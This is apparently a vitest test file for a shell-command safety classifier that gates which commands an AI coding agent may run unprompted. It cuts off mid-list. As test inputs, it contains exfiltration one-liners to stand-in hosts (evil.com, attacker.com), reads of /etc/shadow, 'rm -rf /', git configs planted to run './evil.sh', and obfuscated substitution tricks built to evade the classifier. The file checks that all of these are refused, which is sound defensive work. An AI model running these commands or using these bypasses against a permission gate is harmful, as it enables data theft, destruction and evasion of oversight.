/**
 * @license
 * Copyright 2025 Qwen
 * SPDX-License-Identifier: Apache-2.0
 */

import { afterAll, afterEach, beforeAll, describe, expect, it } from 'vitest';
import { execFileSync } from 'node:child_process';
import { mkdtempSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import path from 'node:path';
import {
  NEVER_READ_ONLY_ROOT_COMMANDS,
  classifyShellCommandSafety,
  initParser,
  isShellCommandReadOnlyAST,
  isShellCommandReadOnlyASTInDirectory,
  extractCommandRules,
  plantsStateForLaterCommands,
  _resetParser,
  _setParserFailedForTesting,
} from './shellAstParser.js';
import { isShellCommandReadOnly } from './shellReadOnlyChecker.js';

beforeAll(async () => {
  await initParser();
});

afterAll(() => {
  _resetParser();
});

// =========================================================================
// isShellCommandReadOnlyAST — mirror all tests from shellReadOnlyChecker.test.ts
// =========================================================================

describe('isShellCommandReadOnlyAST', () => {
  it('allows simple read-only command', async () => {
    expect(await isShellCommandReadOnlyAST('ls -la')).toBe(true);
  });

  it('rejects mutating commands like rm', async () => {
    expect(await isShellCommandReadOnlyAST('rm -rf temp')).toBe(false);
  });

  it('rejects redirection output', async () => {
    expect(await isShellCommandReadOnlyAST('ls > out.txt')).toBe(false);
  });

  it('rejects command substitution', async () => {
    expect(await isShellCommandReadOnlyAST('echo $(touch file)')).toBe(false);
  });

  it('rejects the two substitution forms from issue #8582', async () => {
    for (const command of [
      'echo "$\\\n(touch /tmp/pwned)"',
      'echo "${one="$"}${two="$one(touch /tmp/pwned)"}${two@P}"',
    ]) {
      expect(await isShellCommandReadOnlyAST(command)).toBe(false);
      expect(await classifyShellCommandSafety(command)).toBe('unknown');
    }
  });

  it('keeps literal twins of issue #8582 read-only', async () => {
    for (const command of [
      'echo "\\$\\\n(touch /tmp/pwned)"',
      'echo "$$\\\n(touch /tmp/pwned)"',
      "echo '$\\\n(touch /tmp/pwned)'",
      "echo '${two@P}'",
      'echo "${two@Q}"',
    ]) {
      expect(await isShellCommandReadOnlyAST(command)).toBe(true);
    }
  });

  describe('repository-local Git config (#8575)', () => {
    const tempDirs: string[] = [];
    const createRepo = (): string => {
      const dir = mkdtempSync(path.join(tmpdir(), 'qwen-git-config-'));
      tempDirs.push(dir);
      execFileSync('git', ['init', '-q'], { cwd: dir });
      return dir;
    };
    const gitConfig = (cwd: string, ...args: string[]): void => {
      execFileSync('git', ['config', ...args], { cwd });
    };

    afterEach(() => {
      for (const dir of tempDirs.splice(0)) {
        rmSync(dir, { recursive: true, force: true });
      }
    });

    it('downgrades only the two reproduced command/config pairs', async () => {
      const cwd = createRepo();
      gitConfig(cwd, 'diff.external', 'example-external-diff');
      expect(await isShellCommandReadOnlyASTInDirectory('git diff', cwd)).toBe(
        false,
      );
      expect(
        await isShellCommandReadOnlyASTInDirectory('git status', cwd),
      ).toBe(true);

      gitConfig(cwd, '--unset', 'diff.external');
      gitConfig(cwd, 'core.fsmonitor', 'example-fsmonitor');
      expect(
        await isShellCommandReadOnlyASTInDirectory('git status', cwd),
      ).toBe(false);
      expect(await isShellCommandReadOnlyASTInDirectory('git diff', cwd)).toBe(
        true,
      );

      gitConfig(cwd, 'core.fsmonitor', 'false');
      expect(
        await isShellCommandReadOnlyASTInDirectory('git status', cwd),
      ).toBe(true);
    });

    it('uses Git include and precedence semantics', async () => {
      const cwd = createRepo();
      const included = path.join(cwd, 'included.config');
      writeFileSync(included, '[diff]\n\texternal = included-driver\n');
      gitConfig(cwd, 'include.path', included);
      expect(
        await isShellCommandReadOnlyASTInDirectory("git 'diff'", cwd),
      ).toBe(false);

      gitConfig(cwd, 'diff.external', '');
      expect(await isShellCommandReadOnlyASTInDirectory('git diff', cwd)).toBe(
        true,
      );
    });

    it('refuses a vouched frontend against any program-executing key', async () => {
      // The gate modelled only `diff.external`/`core.fsmonitor`, but a wrapper
      // has no sub-command filter, so every key that makes a read verb run a
      // program reaches it — including a `!` alias, which git runs through the
      // shell for a verb it does not recognise.
      const vouched = { extraReadOnlyRoots: new Set(['gitw']) };
      for (const [key, value] of [
        ['alias.pwn', '!./evil.sh'],
        // Git re-parses a dash-leading alias in global-option context, so it
        // executes a program with no `!` anywhere.
        ['alias.sync', '-c diff.external=./evil.sh diff'],
        ['gpg.program', './evil.sh'],
        ['gpg.ssh.program', './evil.sh'],
        ['gpg.x509.program', './evil.sh'],
        ['diff.evil.textconv', './evil.sh'],
        ['diff.evil.command', './evil.sh'],
        ['filter.evil.clean', './evil.sh'],
        ['filter.evil.smudge', './evil.sh'],
        // The long-running filter protocol, written by `git lfs install`
        // alongside the clean/smudge keys above.
        ['filter.evil.process', './evil.sh'],
        // Transport, credential and pager programs. Git lowercases the section
        // and name parts of a key, so these come back as `core.sshcommand`;
        // spelling them camelCase in the probe made this whole family inert.
        ['core.sshCommand', './evil.sh'],
        ['core.askPass', './evil.sh'],
        ['core.gitProxy', './evil.sh'],
        ['core.pager', './evil.sh'],
        ['pager.log', './evil.sh'],
        ['credential.helper', './evil.sh'],
        ['credential.https://example.com.helper', './evil.sh'],
        ['remote.origin.uploadpack', './evil.sh'],
        ['remote.origin.receivepack', './evil.sh'],
        // `post-index-change` fires when `git status` refreshes the index.
        ['core.hooksPath', './hooks'],
      ]) {
        const cwd = createRepo();
        gitConfig(cwd, key!, value!);
        expect(
          await isShellCommandReadOnlyASTInDirectory('gitw show', cwd, vouched),
        ).toBe(false);
        expect(
          await isShellCommandReadOnlyASTInDirectory('gitw pwn', cwd, vouched),
        ).toBe(false);
      }
    });

    it('leaves literal git alone when only a helper key is planted', async () => {
      // `git lfs install --local` writes `filter.lfs.clean` in a large share
      // of real checkouts. Keying literal `git diff` to the new flag would
      // downgrade all of them, so the flag is consumed on the vouched path
      // only and literal git keeps its two original checks.
      const cwd = createRepo();
      gitConfig(cwd, 'filter.lfs.clean', 'git-lfs clean -- %f');
      expect(await isShellCommandReadOnlyASTInDirectory('git diff', cwd)).toBe(
        true,
      );
      expect(
        await isShellCommandReadOnlyASTInDirectory('git status', cwd),
      ).toBe(true);
    });

    it('gives a vouched git frontend the same planted-config gate', async () => {
      // The vouch exists for wrapper CLIs, so keying this defence to the
      // literal name `git` would let `gitw status` run a planted
      // `core.fsmonitor` that `git status` is stopped from running. A wrapper
      // is free to spell its verb anywhere in argv, so the gate is not
      // sub-command filtered for vouched roots.
      const vouched = { extraReadOnlyRoots: new Set(['gitw']) };
      const clean = createRepo();
      // A repository that plants nothing is unaffected: the gate is keyed to
      // the risk, not to the vouch.
      expect(
        await isShellCommandReadOnlyASTInDirectory('gitw status', clean, {
          extraReadOnlyRoots: new Set(['gitw']),
        }),
      ).toBe(true);

      const hostile = createRepo();
      gitConfig(hostile, 'core.fsmonitor', 'example-fsmonitor');
      gitConfig(hostile, 'diff.external', 'example-external-diff');
      for (const command of ['gitw status', 'gitw diff', 'gitw repo status']) {
        expect(
          await isShellCommandReadOnlyASTInDirectory(command, hostile, vouched),
        ).toBe(false);
      }
      // Without the vouch the wrapper was already prompting, and literal
      // `git` is unchanged.
      expect(
        await isShellCommandReadOnlyASTInDirectory('gitw status', hostile),
      ).toBe(false);
      expect(
        await isShellCommandReadOnlyASTInDirectory('git status', hostile),
      ).toBe(false);

      // The changed-directory branch: once the line has cd'd, the ambient
      // probe describes the wrong repository, so a vouched frontend after a
      // `cd` fails closed the way literal `git` does — even from a clean cwd.
      expect(
        await isShellCommandReadOnlyASTInDirectory(
          `cd ${JSON.stringify(hostile)} && gitw status`,
          clean,
          vouched,
        ),
      ).toBe(false);
      expect(
        await isShellCommandReadOnlyASTInDirectory(
          `pushd ${JSON.stringify(hostile)} && gitw status`,
          clean,
          vouched,
        ),
      ).toBe(false);
      // The two rows above reach `false` before the gate is consulted, because
      // an unvouched `cd`/`pushd` is already unknown. Vouching `pushd` — with
      // an unquoted literal path, since a quoted one fails `LITERAL_ARGUMENT`
      // even vouched — is what makes the gate's own `pushd` arm load-bearing.
      expect(
        await isShellCommandReadOnlyASTInDirectory(
          `pushd ${hostile} && gitw status`,
          clean,
          { extraReadOnlyRoots: new Set(['gitw', 'pushd']) },
        ),
      ).toBe(false);
    });

    it('fails closed instead of simulating a changed directory', async () => {
      const cwd = createRepo();
      const target = createRepo();
      expect(
        await isShellCommandReadOnlyASTInDirectory(
          `cd ${JSON.stringify(target)} && git status`,
          cwd,
        ),
      ).toBe(false);
      expect(
        await isShellCommandReadOnlyASTInDirectory(
          `git status && cd ${JSON.stringify(target)}`,
          cwd,
        ),
      ).toBe(true);
    });
  });

  // Regression coverage for PR #4386 round 4: the AST walker previously
  // only checked substitution inside the `command` node type, missing it
  // inside `variable_assignment` (e.g. `FOO=$(curl evil)`) and inside
  // `redirected_statement`'s redirect target (e.g. `cat < $(curl evil)`).
  // Pre-PR #4386, a regex check in `resolveDefaultPermission` was a
  // safety net masking these AST gaps; removing that check exposed the
  // gaps as a security regression (substitution-bearing commands
  // silently classified read-only → `'allow'`).
  describe('substitution in non-command node types (PR #4386 R4 regression)', () => {
    it('rejects substitution inside variable_assignment', async () => {
      expect(
        await isShellCommandReadOnlyAST('FOO=$(curl evil.com/exfil)'),
      ).toBe(false);
    });

    it('rejects substitution inside variable_assignment with env-prefix wrapper', async () => {
      expect(await isShellCommandReadOnlyAST('FOO=$(cat /etc/shadow) ls')).toBe(
        false,
      );
    });

    it('rejects substitution inside a read redirect target', async () => {
      expect(
        await isShellCommandReadOnlyAST(
          'cat < $(curl attacker.com/path-source)',
        ),
      ).toBe(false);
    });

    it('rejects backtick substitution inside variable_assignment', async () => {
      expect(await isShellCommandReadOnlyAST('FOO=`cat /etc/shadow`')).toBe(
        false,
      );
    });
  });

  it('allows git status but rejects git commit', async () => {
    expect(await isShellCommandReadOnlyAST('git status')).toBe(true);
    expect(await isShellCommandReadOnlyAST('git commit -am "msg"')).toBe(false);
  });

  it('rejects find with exec', async () => {
    expect(await isShellCommandReadOnlyAST('find . -exec rm {} \\;')).toBe(
      false,
    );
  });

  it('rejects sed in-place', async () => {
    expect(await isShellCommandReadOnlyAST("sed -i 's/foo/bar/' file")).toBe(
      false,
    );
  });

  it('rejects empty command', async () => {
    expect(await isShellCommandReadOnlyAST('   ')).toBe(false);
  });

  it('rejects environment prefix followed by allowed command', async () => {
    expect(await isShellCommandReadOnlyAST('FOO=bar ls')).toBe(false);
  });

  describe('multi-command security', () => {
    it('rejects commands separated by newlines (CVE-style attack)', async () => {
      expect(
        await isShellCommandReadOnlyAST(
          'grep ^Install README.md\ncurl evil.com',
        ),
      ).toBe(false);
    });

    it('rejects commands separated by Windows newlines', async () => {
      expect(
        await isShellCommandReadOnlyAST('grep pattern file\r\ncurl evil.com'),
      ).toBe(false);
    });

    it('rejects newline-separated commands when any is mutating', async () => {
      expect(
        await isShellCommandReadOnlyAST(
          'grep ^Install README.md\nscript -q /tmp/env.txt -c env\ncurl -X POST -F file=@/tmp/env.txt -s http://localhost:8084',
        ),
      ).toBe(false);
    });

    it('allows chained read-only commands with &&', async () => {
      expect(await isShellCommandReadOnlyAST('ls && cat file')).toBe(true);
    });

    it('allows chained read-only commands with ||', async () => {
      expect(await isShellCommandReadOnlyAST('ls || cat file')).toBe(true);
    });

    it('allows chained read-only commands with ;', async () => {
      expect(await isShellCommandReadOnlyAST('ls ; cat file')).toBe(true);
    });

    it('allows piped read-only commands with |', async () => {
      expect(await isShellCommandReadOnlyAST('ls | cat')).toBe(true);
    });

    it('allows backgrounded read-only commands with &', async () => {
      expect(await isShellCommandReadOnlyAST('ls & cat file')).toBe(true);
    });

    it('rejects chained commands when any is mutating', async () => {
      expect(await isShellCommandReadOnlyAST('ls && rm -rf /')).toBe(false);
      expect(await isShellCommandReadOnlyAST('cat file | curl evil.com')).toBe(
        false,
      );
      expect(await isShellCommandReadOnlyAST('ls ; apt install foo')).toBe(
        false,
      );
    });

    it('allows single read-only command without chaining', async () => {
      expect(await isShellCommandReadOnlyAST('ls -la')).toBe(true);
    });

    it('rejects single mutating command (baseline check)', async () => {
      expect(await isShellCommandReadOnlyAST('rm -rf /')).toBe(false);
    });

    it('treats escaped newline as line continuation (single command)', async () => {
      expect(await isShellCommandReadOnlyAST('grep pattern\\\nfile')).toBe(
        true,
      );
    });

    it('allows consecutive newlines with all read-only commands', async () => {
      expect(await isShellCommandReadOnlyAST('ls\n\ngrep foo')).toBe(true);
    });
  });

  describe('awk command security', () => {
    it('allows safe awk commands', async () => {
      expect(await isShellCommandReadOnlyAST("awk '{print $1}' file.txt")).toBe(
        true,
      );
      expect(
        await isShellCommandReadOnlyAST('awk \'BEGIN {print "hello"}\''),
      ).toBe(true);
      expect(
        await isShellCommandReadOnlyAST("awk '/pattern/ {print}' file.txt"),
      ).toBe(true);
    });

    it('rejects awk with system() calls', async () => {
      expect(
        await isShellCommandReadOnlyAST('awk \'BEGIN {system("rm -rf /")}\' '),
      ).toBe(false);
      expect(
        await isShellCommandReadOnlyAST(
          'awk \'{system("touch file")}\' input.txt',
        ),
      ).toBe(false);
    });

    it('rejects gawk indirect function calls', async () => {
      for (const command of [
        'awk \'BEGIN { fn = "system"; @fn("touch /tmp/pwned") }\'',
        'awk \'BEGIN { fn = "system"; @ fn("touch /tmp/pwned") }\'',
      ]) {
        expect(await isShellCommandReadOnlyAST(command)).toBe(false);
      }
    });

    it('rejects awk with file output redirection', async () => {
      expect(
        await isShellCommandReadOnlyAST(
          'awk \'{print > "output.txt"}\' input.txt',
        ),
      ).toBe(false);
      expect(
        await isShellCommandReadOnlyAST(
          'awk \'{printf "%s\\n", $0 > "file.txt"}\'',
        ),
      ).toBe(false);
      expect(
        await isShellCommandReadOnlyAST(
          'awk \'{print >> "append.txt"}\' input.txt',
        ),
      ).toBe(false);
    });

    it('rejects awk with command pipes', async () => {
      expect(
        await isShellCommandReadOnlyAST('awk \'{print | "sort"}\' input.txt'),
      ).toBe(false);
    });

    it('rejects awk with getline from commands', async () => {
      expect(
        await isShellCommandReadOnlyAST('awk \'BEGIN {getline < "date"}\''),
      ).toBe(false);
      expect(
        await isShellCommandReadOnlyAST('awk \'BEGIN {"date" | getline}\''),
      ).toBe(false);
    });

    it('rejects awk with close() calls', async () => {
      expect(
        await isShellCommandReadOnlyAST('awk \'BEGIN {close("file")}\''),
      ).toBe(false);
    });
  });

  describe('sed command security', () => {
    it('allows safe sed commands', async () => {
      expect(await isShellCommandReadOnlyAST("sed 's/foo/bar/' file.txt")).toBe(
        true,
      );
      expect(await isShellCommandReadOnlyAST("sed -n '1,5p' file.txt")).toBe(
        true,
      );
    });

    it('rejects sed with execute command', async () => {
      expect(
        await isShellCommandReadOnlyAST("sed 's/foo/bar/e' file.txt"),
      ).toBe(false);
    });

    it('rejects sed with write command', async () => {
      expect(
        await isShellCommandReadOnlyAST(
          "sed 's/foo/bar/w output.txt' file.txt",
        ),
      ).toBe(false);
    });

    it('rejects sed with read command', async () => {
      expect(
        await isShellCommandReadOnlyAST("sed 's/foo/bar/r input.txt' file.txt"),
      ).toBe(false);
    });

    it('still rejects sed in-place editing', async () => {
      expect(
        await isShellCommandReadOnlyAST("sed -i 's/foo/bar/' file.txt"),
      ).toBe(false);
      expect(
        await isShellCommandReadOnlyAST("sed --in-place 's/foo/bar/' file.txt"),
      ).toBe(false);
    });
  });

  // =======================================================================
  // Additional AST-specific edge cases
  // =======================================================================

  describe('AST-specific edge cases', () => {
    it('rejects backtick command substitution', async () => {
      expect(await isShellCommandReadOnlyAST('echo `rm -rf /`')).toBe(false);
    });

    it('rejects process substitution with write', async () => {
      // process_substitution is conservatively handled as command_substitution
      expect(await isShellCommandReadOnlyAST('diff <(ls) <(ls -a)')).toBe(
        false,
      );
    });

    it('allows pure variable assignment', async () => {
      expect(await isShellCommandReadOnlyAST('FOO=bar')).toBe(true);
    });

    it('rejects multiple env vars before command', async () => {
      expect(await isShellCommandReadOnlyAST('A=1 B=2 ls -la')).toBe(false);
    });

    it('rejects function definitions', async () => {
      expect(await isShellCommandReadOnlyAST('foo() { rm -rf /; }')).toBe(
        false,
      );
    });

    it('allows git diff', async () => {
      expect(
        await isShellCommandReadOnlyAST(
          'git diff --word-diff=color -- file.txt',
        ),
      ).toBe(true);
    });

    it('allows git log', async () => {
      expect(await isShellCommandReadOnlyAST('git log --oneline -10')).toBe(
        true,
      );
    });

    it('rejects git push', async () => {
      expect(await isShellCommandReadOnlyAST('git push origin main')).toBe(
        false,
      );
    });

    it('allows git --version / --help', async () => {
      expect(await isShellCommandReadOnlyAST('git --version')).toBe(true);
      expect(await isShellCommandReadOnlyAST('git --help')).toBe(true);
    });

    it('allows input redirection (read-only)', async () => {
      expect(await isShellCommandReadOnlyAST('cat < input.txt')).toBe(true);
    });

    it('rejects append redirection', async () => {
      expect(await isShellCommandReadOnlyAST('echo hello >> out.txt')).toBe(
        false,
      );
    });

    it('allows here-string', async () => {
      expect(await isShellCommandReadOnlyAST('cat <<< "hello"')).toBe(true);
    });

    it('rejects nested command substitution', async () => {
      expect(await isShellCommandReadOnlyAST('echo $(echo $(rm foo))')).toBe(
        false,
      );
    });

    it('allows complex pipeline of read-only commands', async () => {
      expect(
        await isShellCommandReadOnlyAST(
          'find . -name "*.ts" | grep -v node_modules | sort | head -20',
        ),
      ).toBe(true);
    });

    it('rejects pipeline with mutating command', async () => {
      expect(
        await isShellCommandReadOnlyAST('find . -name "*.ts" | xargs rm'),
      ).toBe(false);
    });

    it('allows git branch (no mutating flags)', async () => {
      expect(await isShellCommandReadOnlyAST('git branch')).toBe(true);
      expect(await isShellCommandReadOnlyAST('git branch -a')).toBe(true);
    });

    it('rejects git branch -d', async () => {
      expect(await isShellCommandReadOnlyAST('git branch -d feature')).toBe(
        false,
      );
    });

    it('allows git remote (no mutating action)', async () => {
      expect(await isShellCommandReadOnlyAST('git remote -v')).toBe(true);
    });

    it('rejects git remote add', async () => {
      expect(await isShellCommandReadOnlyAST('git remote add origin url')).toBe(
        false,
      );
    });
  });
});

// =========================================================================
// classifyShellCommandSafety
// =========================================================================

describe('substitution hidden in an expansion pattern word', () => {
  // tree-sitter-bash parses the pattern word as a leaf, so the substitution
  // never becomes a command_substitution node — but bash still runs it.
  it.each(['%%', '%', '##', '#', '^^', '^', ',,', ','])(
    'refuses a command substitution hidden by the operator %s',
    async (operator) => {
      expect(
        await classifyShellCommandSafety(
          `echo \${HOME${operator}$(rm -rf build)}`,
        ),
      ).toBe('unknown');
      expect(
        await classifyShellCommandSafety(
          `echo "\${HOME${operator}$(rm -rf build)}"`,
        ),
      ).toBe('unknown');
      expect(
        await classifyShellCommandSafety(
          `echo \${HOME${operator}\`rm -rf build\`}`,
        ),
      ).toBe('unknown');
    },
  );

  // bash runs `<(…)` and `>(…)` in a pattern word exactly as it runs `$(…)`,
  // and tree-sitter emits no node for those either.
  it.each(['%%', '%', '##', '#', '^^', '^', ',,', ','])(
    'refuses a process substitution hidden by the operator %s',
    async (operator) => {
      for (const opener of ['<(', '>(']) {
        expect(
          await classifyShellCommandSafety(
            `echo \${HOME${operator}${opener}rm -rf build)}`,
          ),
        ).toBe('unknown');
        expect(
          await classifyShellCommandSafety(
            `echo "\${HOME${operator}${opener}rm -rf build)}"`,
          ),
        ).toBe('unknown');
      }
    },
  );

  // `${v@P}` runs any $(…) held in the variable's value, and in a pattern word
  // it is a leaf, so the @/P child-adjacency check never sees it either.
  it.each(['%%', '%', '##', '#', '^^', '^', ',,', ','])(
    'refuses a prompt expansion hidden by the operator %s',
    async (operator) => {
      expect(
        await classifyShellCommandSafety(`echo \${x${operator}\${v@P}}`),
      ).toBe('unknown');
    },
  );

  // `${var/pat/rep}` has two halves and bash expands both, so each needs its
  // own pin — the pattern half is where the other operators put their word,
  // and the replacement half is the one an operator-shaped test never reaches.
  // A `$(…)` here does become a real command_substitution node, so it is
  // classified from the command inside it — `write`, which is stronger than
  // the `unknown` the leaf-parsed spellings get. Both are refusals; they are
  // pinned apart so that a spelling silently changing category is a failure.
  it.each([
    ['pattern', 'echo ${x/$(rm -rf build)/rep}', 'write'],
    ['pattern', 'echo ${x/`rm -rf build`/rep}', 'unknown'],
    ['pattern', 'echo ${x/<(rm -rf build)/rep}', 'unknown'],
    ['pattern', 'echo ${x/${v@P}/rep}', 'unknown'],
    ['replacement', 'echo ${x/pat/$(rm -rf build)}', 'write'],
    ['replacement', 'echo ${x/pat/`rm -rf build`}', 'unknown'],
    ['replacement', 'echo ${x/pat/<(rm -rf build)}', 'unknown'],
    ['replacement', 'echo ${x//pat/$(rm -rf build)}', 'write'],
  ])(
    'refuses a substitution in the %s half of ${var/…/…}',
    async (_half, command, expected) => {
      expect(await classifyShellCommandSafety(command)).toBe(expected);
      expect(await classifyShellCommandSafety(`"${command}"`)).toBe(expected);
    },
  );

  it('treats ${var/pat/${v@P}} as unknown', async () => {
    expect(await classifyShellCommandSafety('echo ${x/pat/${v@P}}')).toBe(
      'unknown',
    );
  });

  // The default/assign/error/alternate operators take a *word* just as the
  // trim and case operators do, and bash expands it the same way.
  it.each([':-', '-', ':=', '=', ':?', '?', ':+', '+'])(
    'refuses a substitution behind the value operator %s',
    async (operator) => {
      // `$(…)` becomes a real node and is classified from the command inside
      // it; the leaf-parsed spellings reach the regex instead.
      expect(
        await classifyShellCommandSafety(`echo \${x${operator}$(rm -rf b)}`),
      ).toBe('write');
      for (const payload of ['`rm -rf b`', '<(rm -rf b)', '${v@P}']) {
        expect(
          await classifyShellCommandSafety(`echo \${x${operator}${payload}}`),
        ).toBe('unknown');
      }
    },
  );

  it('refuses a substitution in a substring or subscript position', async () => {
    expect(await classifyShellCommandSafety('echo ${x:1:$(rm -rf b)}')).toBe(
      'write',
    );
    expect(await classifyShellCommandSafety('echo ${x[$(rm -rf b)]}')).toBe(
      'write',
    );
    expect(await classifyShellCommandSafety('echo ${!x@P}')).toBe('unknown');
  });

  it('does not flag expansions without a substitution', async () => {
    expect(await classifyShellCommandSafety('echo ${HOME%%/*}')).toBe(
      'read-only',
    );
    expect(await classifyShellCommandSafety('echo ${HOME}')).toBe('read-only');
  });
});

describe('substitution hidden in a heredoc body', () => {
  // The body is one leaf too, and bash expands it before feeding it to stdin.
  // Expansion there follows double-quote rules, so `$(…)`, backticks and the
  // `@P` operator run while `<(…)` does not.
  it('treats an unquoted-delimiter body containing a substitution as unsafe', async () => {
    expect(
      await classifyShellCommandSafety('cat <<EOF\n`rm -rf build`\nEOF'),
    ).toBe('unknown');
    expect(
      await classifyShellCommandSafety('cat <<-EOF\n`rm -rf build`\nEOF'),
    ).toBe('unknown');
  });

  it('treats $(…) in a body as unsafe, tab-stripped form included', async () => {
    // A `<<-` body is always one raw leaf, so the `$(` branch of the body
    // regex is the only thing that catches this — the AST walk sees no
    // command_substitution node to classify.
    // Only the tab-indented `<<-` spelling is the always-leaf case the body
    // regex has to catch; the others parse into a real command_substitution
    // node and are classified from the command inside it. Pinned apart so a
    // spelling silently changing category is a failure, not a pass.
    expect(
      await classifyShellCommandSafety('cat <<-EOF\n\t$(rm -rf build)\n\tEOF'),
    ).toBe('unknown');
    expect(
      await classifyShellCommandSafety('cat <<-EOF\n$(rm -rf build)\nEOF'),
    ).toBe('write');
    expect(
      await classifyShellCommandSafety('cat <<EOF\n$(rm -rf build)\nEOF'),
    ).toBe('write');
    // Nested one level deep, where the closing paren is not the last
    // character of the line.
    expect(
      await classifyShellCommandSafety(
        'cat <<-EOF\n\tprefix $(rm -rf build) suffix\n\tEOF',
      ),
    ).toBe('write');
  });

  it('treats ${v@P} in a body as unsafe, tab-stripped form included', async () => {
    // A `<<-` body is always one raw leaf, so the expansion never becomes a
    // child node the walk above could see.
    expect(
      await classifyShellCommandSafety('cat <<-EOF\n\t${v@P}\n\tEOF'),
    ).toBe('unknown');
    expect(await classifyShellCommandSafety('cat <<EOF\n${v@P}\nEOF')).toBe(
      'unknown',
    );
  });

  it('does not flag a process substitution in a body, which bash never runs', async () => {
    expect(
      await classifyShellCommandSafety('cat <<EOF\n<(rm -rf build)\nEOF'),
    ).toBe('read-only');
  });

  it('leaves a quoted delimiter alone, which makes the body inert', async () => {
    expect(
      await classifyShellCommandSafety("cat <<'EOF'\n`rm -rf build`\nEOF"),
    ).toBe('read-only');
    expect(
      await classifyShellCommandSafety('cat <<"EOF"\n`rm -rf build`\nEOF'),
    ).toBe('read-only');
    // `<<\EOF` quotes the delimiter just as surely.
    expect(
      await classifyShellCommandSafety('cat <<\\EOF\n$(rm -rf build)\nEOF'),
    ).toBe('read-only');
  });

  it('refuses a substitution in the heredoc DELIMITER, which bash expands', async () => {
    // The body and the opener-line segments are pinned above and below, but
    // the delimiter itself was not — and bash expands it. Today the refusal
    // rides on two mechanisms this block never asserts (the `root.hasError`
    // bailout and the ERROR node landing in the unknown-floored default arm),
    // so a tree-sitter upgrade that parses the `$(…)` into real nodes, or a
    // refactor of either mechanism, would flip this to read-only unnoticed.
    expect(
      await classifyShellCommandSafety('cat <<$(rm -rf build)\nhello\nEOF'),
    ).toBe('unknown');
    expect(
      await classifyShellCommandSafety('vtool <<$(rm -rf build)\nhello\nEOF', {
        extraReadOnlyRoots: new Set(['vtool']),
      }),
    ).toBe('unknown');
    expect(
      await classifyShellCommandSafety('cat <<`rm -rf build`\nhello\nEOF'),
    ).toBe('unknown');
  });

  // A pipeline written after the heredoc opener is parsed *inside* the
  // `heredoc_redirect` node, next to the body — so the arm that filters
  // redirects out of a `redirected_statement` used to drop the whole segment.
  it.each([
    'vtool <<EOF | rm -rf build\nhello\nEOF',
    'vtool <<EOF | mkdir -p build\nhello\nEOF',
    'vtool <<EOF | tee out.txt\nhello\nEOF',
    // The same command with the pipeline after the body, which parses as an
    // ordinary sibling and was already classified.
    'vtool <<EOF\nhello\nEOF | rm -rf build',
    // The shape predates the vouch for built-in roots, so it is pinned there
    // too — the vouch only turned the prompt into an unattended auto-run.
    'cat <<EOF | rm -rf build\nhello\nEOF',
    // Not just pipelines: whatever follows `&&`, `||` or `;` on the opener
    // line is a direct named child of the redirect too, across every
    // statement shape tree-sitter has.
    'vtool <<EOF && ! rm x\nhello\nEOF',
    'vtool <<EOF && if true; then rm x; fi\nhello\nEOF',
    'vtool <<EOF && for i in 1; do rm x; done\nhello\nEOF',
    'vtool <<EOF && while true; do rm x; done\nhello\nEOF',
    'vtool <<EOF && until false; do rm x; done\nhello\nEOF',
    'vtool <<EOF || rm -rf build\nhello\nEOF',
    // These two need no vouch at all — `cat` is a built-in read-only root.
    'cat <<EOF && for ((i=0;i<1;i++)); do rm -rf build; done\nhello\nEOF',
    'cat <<EOF && select x in a; do rm -rf build; done\nhello\nEOF',
  ])('evaluates the write segment of %s', async (command) => {
    expect(
      await classifyShellCommandSafety(command, {
        extraReadOnlyRoots: new Set(['vtool']),
      }),
    ).toBe('write');
  });

  it('refuses a semicolon-separated segment after a heredoc opener', async () => {
    // `;` puts the segment in the redirect too, but tree-sitter gives it a
    // shape the classifier reads as `unknown` rather than `write`. Both are
    // refusals; pinned at its real category so a change of category fails.
    expect(
      await classifyShellCommandSafety(
        'vtool <<EOF; rm -rf build\nhello\nEOF',
        {
          extraReadOnlyRoots: new Set(['vtool']),
        },
      ),
    ).toBe('unknown');
  });

  it('still reads a heredoc with no pipeline as read-only', async () => {
    expect(
      await classifyShellCommandSafety('vtool <<EOF\nhello\nEOF', {
        extraReadOnlyRoots: new Set(['vtool']),
      }),
    ).toBe('read-only');
    expect(
      await classifyShellCommandSafety('vtool <<EOF | wc -l\nhello\nEOF', {
        extraReadOnlyRoots: new Set(['vtool']),
      }),
    ).toBe('read-only');
  });

  it('does not flag a body without a substitution', async () => {
    expect(await classifyShellCommandSafety('cat <<EOF\nplain\nEOF')).toBe(
      'read-only',
    );
  });
});

describe('classifyShellCommandSafety', () => {
  it.each([
    'ls -la',
    'git status --short',
    'ls | cat && pwd',
    'FOO=bar',
    'cd /tmp',
    '(git status)',
    '{ ls; pwd; }',
    'cat < input.txt',
    'cat <<EOF\nhello\nEOF',
    'echo 2>&1',
    'echo >&-',
    'uniq input.txt',
    'uniq -- -f',
    'git branch --list --color=always topic',
    'git diff -o patch',
    'git diff -Oorderfile',
    'git log -p',
    'git show -p HEAD',
    'git blame -p file',
    'git log -- --output=log.out',
    'sort -- -o output',
    'tree -- -o output',
    'rg -- -z file',
    'sort -- -roout input',
    'sort -- --output=out',
    "sed -- 's/a/b/' input",
    "sed 's/a/*/' file",
    "sed 's/old/new/' file",
    "sed 's/hello/world/' file",
    "sed 's/error/warning/g' file",
    "sed -n '/needle/p' file",
    "sed '/pattern/d' file",
    "sed 's/a/woutput/' file",
    "sed 's#x#s/a/b/woutput#' file",
    "sed 's#x#foo;woutput#' file",
    "sed 'p;d' file",
    "awk '{ print*2 }' file",
    "awk -- '{ print }' input",
    "awk -F : '{ print $1 }' input",
    'awk \'BEGIN { print "user@example.com" }\'',
    "printf '%s' value",
  ])('classifies %j as read-only', async (command) => {
    expect(await classifyShellCommandSafety(command)).toBe('read-only');
  });

  it.each([
    ...[
      'chgrp',
      'chmod',
      'chown',
      'cp',
      'install',
      'ln',
      'mkdir',
      'mkfifo',
      'mknod',
      'mv',
      'rename',
      'rm',
      'rmdir',
      'shred',
      'touch',
      'truncate',
      'unlink',
    ].map((root) => `${root} target`),
    ...'add am checkout cherry-pick clean clone commit fetch gc init merge mv pull push rebase reset restore revert rm stash switch'
      .split(' ')
      .map((subcommand) => `git ${subcommand} target`),
    'kill 123',
    'kill -- -0',
    'kill "$PID"',
    'pkill -n 0',
    'pkill -n0 process',
    'pkill -s0 process',
    'pkill -s 0 process',
    'pkill -s "$SESSION" process',
    'killall -n0 process',
    'echo > out',
    '> out',
    'export FOO=bar > out',
    'echo >> out',
    'echo >| out',
    'echo &> out',
    'echo &>> out',
    'echo >& out',
    '> out echo',
    'git commit -m message',
